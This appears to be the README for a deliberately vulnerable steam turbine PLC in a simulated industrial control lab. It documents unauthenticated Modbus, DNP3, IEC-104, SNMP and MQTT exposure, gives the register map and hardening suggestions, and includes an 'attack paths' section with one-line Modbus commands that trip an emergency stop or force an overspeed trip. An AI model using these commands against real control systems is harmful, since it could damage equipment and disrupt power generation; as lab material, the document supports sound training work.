# Turbine PLC

`hex-turbine-plc` controls the steam turbine at the heart of UU P&L's generation
plant. It runs a physics simulation of turbine RPM, temperature, pressure, and
electrical output, operates a proportional governor to hold 3000 RPM, and polls
the circuit breaker actuators to mirror their state. Four industrial protocols
are open simultaneously. None require authentication.

The SNMP community strings are `public` (read) and `private` (read-write). They
have not been changed since commissioning. The engineer's note in the config
file reads: "Nobody connects to SNMP anyway."

## In real control networks

Industrial PLCs commonly expose Modbus TCP with no authentication: the network
IS the access control, and the assumption is that the control network is
isolated. In practice the isolation fails, and the result is that any host with
a route to port 502 can read any register and write any setpoint. Multi-protocol
devices (Modbus + DNP3 + IEC-104 + SNMP) are common in generation plant: each
protocol was added at a different time for a different integration, and none were
decommissioned when the next one arrived.

## Container details

Base image: `python:3.11-slim`. No SSH. No login shell.

Packages: `pymodbus 3.6.9`, `paho-mqtt 1.6.1`, `snmpd`.

The PLC is a Python asyncio application running four protocol listeners and two
control loops simultaneously.

Exposed ports (on 10.10.3.21):
- 502/tcp: Modbus TCP (no authentication)
- 20000/tcp: DNP3 (minimal outstation, responds to Read FC)
- 2404/tcp: IEC-104 (Type 9 periodic measurements, live register data)
- 161/udp: SNMP (community `public` read, `private` read-write)
- 4840/tcp: OPC-UA (sidecar `turbine_opcua`, SecurityMode None, anonymous auth)

Modbus register map:

Coils (FC1, writable by anyone):
- 0: emergency_stop (write 1 to trip, write 0 to reset)
- 1-4: alarm flags (overspeed, overtemp, overpressure, undervoltage)
- 5-6: breaker_a/b closed status (mirrored from actuators)

Holding Registers (FC3, writable by anyone):
- 0: governor_setpoint_rpm (default 3000)
- 1: fuel_valve_command (0-100%, managed by governor loop)
- 2: cooling_pump_speed (0-100%)
- 3: overcurrent_threshold (amps, default 200)

Input Registers (FC4, read-only):
- 0-10: turbine_rpm, temp, pressure, voltage_a/b, current_a/b, frequency, power, oil, vibration

SNMP sysDescr: `HEX-CPU-4000 Turbine PLC, Hex Computing Division, firmware 4.1.2`

MQTT: publishes telemetry to `uupl/turbine/telemetry` on the broker at
10.10.3.60 every five seconds. No authentication on the broker.

## Connections

- `ics_control`: 10.10.3.21
- Writes actuator commands to fuel valve (10.10.3.51) and polls breakers
  (10.10.3.53 / 10.10.3.54)
- Polled by relay IEDs (10.10.3.31 / 10.10.3.32)
- Polled by HMI (10.10.3.10)
- Accessible from engineering workstation (10.10.3.100) for configuration

## Protocols

Modbus TCP: port 502.
DNP3: port 20000.
IEC-104: port 2404 (live turbine data: RPM, temperature, voltage, frequency).
OPC-UA: port 4840 (sidecar, see `opcua-sidecar/README.md`).
SNMP: UDP port 161.
MQTT: outbound to port 1883 on broker.

## Built-in vulnerabilities

Unauthenticated Modbus TCP: any host on `ics_control` can read any register or
write any coil or holding register. Writing coil 0 = 1 triggers an immediate
emergency stop. Lowering HR[0] (governor setpoint) below the operating RPM
causes the turbine to coast down. Raising HR[0] above the overspeed trip
threshold (3300) will cause an alarm and automatic trip.

Unauthenticated emergency stop: `write_coil(0, True)` from any Modbus client
with a route to port 502 trips the turbine immediately with no warning.

SNMP read-write community: the `private` community string allows SNMP SET
operations. The snmpd daemon has read-write access on all interfaces. An SNMP
SET cannot directly write Modbus registers, but it can query the system identity
and reconfigure the daemon.

MQTT telemetry with no authentication: telemetry published to the broker is
readable by any subscriber on `ics_control`. An attacker who subscribes to
`uupl/turbine/telemetry` receives real-time RPM, temperature, pressure, and
voltage without any authentication.

SNMP `sysContact` and `sysLocation` disclose the responsible engineer's name
and physical location (`Hex Engine Room, Unseen University, Ankh-Morpork`).

## Modifying vulnerabilities

To disable SNMP: remove `snmpd` from the apt install list in the Dockerfile and
remove the `snmpd` start line from `entrypoint.sh`.

To change SNMP community strings: edit `snmpd.conf`.

To add Modbus authentication: pymodbus does not support authentication natively;
this requires wrapping the server with a custom middleware or replacing it with
a gateway that enforces access control before forwarding.

To change the emergency stop coil address or register map: edit the constants
at the top of `plc_server.py`.

## Hardening suggestions

Restrict network access to port 502 to the specific hosts that legitimately need
it (engineering workstation, HMI). Change SNMP community strings. Disable the
`private` (read-write) community entirely. Consider whether DNP3 and IEC-104
need to be simultaneously active; each additional protocol surface increases
exposure.

## Observability and debugging

```bash
docker logs turbine-plc
docker exec -it turbine-plc bash
```

Read current RPM:
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.21',port=502); c.connect(); print(c.read_input_registers(0,11,slave=1).registers)"
```

SNMP walk:
```bash
snmpwalk -v2c -c public 10.10.3.21
```

Subscribe to MQTT telemetry:
```bash
mosquitto_sub -h 10.10.3.60 -t 'uupl/turbine/telemetry'
```

## Concrete attack paths

From the engineering workstation or from any host on `ics_control`:

Emergency stop (immediate, recoverable):
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.21',502); c.connect(); c.write_coil(0,True,slave=1)"
```

Overspeed trip (raise setpoint above protection threshold):
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.21',502); c.connect(); c.write_register(0,4000,slave=1)"
```

Read all input registers (plant state telemetry):
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.21',502); c.connect(); print(c.read_input_registers(0,11,slave=1).registers)"
```

DNP3 class 0 read (requires a DNP3 client library such as OpenDNP3 or dnp3-python):
connect to 20000/tcp and send a READ request; the outstation responds with RPM,
temperature, voltage, and frequency.

## Edge cases

The physics simulation takes 30-60 seconds to ramp up from cold start. RPM,
temperature, and pressure all start at zero and increase gradually. Readings
during the ramp-up period look like a turbine starting: this is intentional.

The governor loop adjusts the fuel valve to track the setpoint. If the setpoint
is set to zero, the fuel valve closes and the turbine coasts down. This looks
different from an emergency stop: the trip coil remains zero and the physics
continue to run (just with no fuel input).

The MQTT publish loop waits 30 seconds after startup before connecting to the
broker, to give the broker container time to initialise. If the broker is not
reachable, the PLC silently skips MQTT publishing and continues running normally.

Writing to holding register 3 (overcurrent_threshold) changes the threshold
stored in the PLC, but the relay IEDs hold their own copies. Modifying the PLC
threshold does not affect the relay trip behaviour; the relays read from their
own registers.

## At a glance

Steam turbine PLC. Four protocols, none authenticated. Writing coil 0 = 1 from
any host on the control network is an immediate emergency stop. Raising the
governor setpoint above 3300 RPM causes an automatic overspeed trip. SNMP
community `private` is read-write. MQTT telemetry is open to any subscriber
on the control network.
